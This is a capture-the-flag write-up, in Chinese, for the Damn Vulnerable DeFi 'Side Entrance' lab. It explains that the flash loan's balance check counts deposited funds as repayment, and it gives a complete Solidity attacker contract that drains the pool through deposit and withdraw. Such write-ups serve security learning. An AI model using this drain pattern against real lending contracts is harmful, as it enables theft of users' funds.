# Damn Vulnerable DeFi v4 - side entrance

- https://www.damnvulnerabledefi.xyz/challenges/side-entrance/

## check condition

清空 pool 裡面的資金並轉移到 recovery：

```solidity
assertEq(address(pool).balance, 0, "Pool still has ETH");
assertEq(
    recovery.balance,
    ETHER_IN_POOL,
    "Not enough ETH in recovery account"
);
```

## break

有問題的地方在於 flashloan 檢查是「整個合約的餘額」，沒有考慮到 `deposit` 進入的資金也會被計算進去：

```solidity
function deposit() external payable {
    unchecked {
        balances[msg.sender] += msg.value;
    }
    emit Deposit(msg.sender, msg.value);
}

function flashLoan(uint256 amount) external {
    uint256 balanceBefore = address(this).balance;

    IFlashLoanEtherReceiver(msg.sender).execute{value: amount}();

    if (address(this).balance < balanceBefore) {
        revert RepayFailed();
    }
}
```

## solution

先呼叫 falshloan，在 flashloan 中呼叫 `deposit` 回去 pool，接著就可以透過 `withdraw` 將全部的資金轉出：

```solidity
contract Trigger is IFlashLoanEtherReceiver {
    SideEntranceLenderPool internal pool;

    constructor(SideEntranceLenderPool pool_) {
        pool = pool_;
    }

    function execute() public payable {
        pool.deposit{value: msg.value}();
    }

    function flashloan(uint256 amount_) public {
        pool.flashLoan(amount_);
    }

    function withdrawAndSend(address recovery) public {
        pool.withdraw();
        payable(recovery).call{value: address(this).balance}("");
    }

    receive() external payable {}
}
```
